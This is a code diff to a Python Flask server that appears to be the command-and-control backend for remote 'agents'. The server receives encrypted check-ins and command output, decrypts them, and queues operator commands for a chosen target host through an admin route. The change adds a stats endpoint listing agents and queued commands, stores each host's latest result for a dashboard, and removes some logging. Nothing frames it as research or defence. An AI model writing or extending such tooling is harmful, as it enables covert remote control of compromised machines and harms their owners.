@@ -51,22 +51,30 @@ def checkin():
     except Exception as e:
         print(f"[!] Checkin Error: {e}")
         return "Error", 400
+    
+@app.route('/api/stats')
+def api_stats():
+    return jsonify({
+        "agents": agents,
+        "queue": command_queue,
+        "total_count": len(agents)
+    })
 
 @app.route('/result', methods=['POST'])
 def get_result():
     try:
         encrypted_output = request.data
         decrypted_output = cipher.decrypt(encrypted_output).decode()
-
-        # Extract hostname and result (assuming agent sends: "HOSTNAME|RESULT")
-        # If your agent just sends the result, you might need to find which agent checked in last
-        print(f"\n[*] Result received: {decrypted_output}")
         
-        # For simplicity, we'll log it to console. 
-        # To show it on the web UI, you'd save it to the 'agents' dict.
+        # Assuming format "HOSTNAME|OUTPUT"
+        parts = decrypted_output.split('|', 1)
+        if len(parts) == 2:
+            host, output = parts
+            if host in agents:
+                agents[host]['last_result'] = f"[{time.strftime('%H:%M:%S')}] {output}"
+        
         return "OK", 200
     except Exception as e:
-        print(f"[!] Result Error: {e}")
         return "Error", 400
 
 @app.route('/admin/send_cmd', methods=['POST'])
@@ -83,6 +91,8 @@ def send_command():
         
     print(f"[*] Command '{cmd}' queued for {target}")
     return redirect(url_for('dashboard'))
+
+
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=5000)
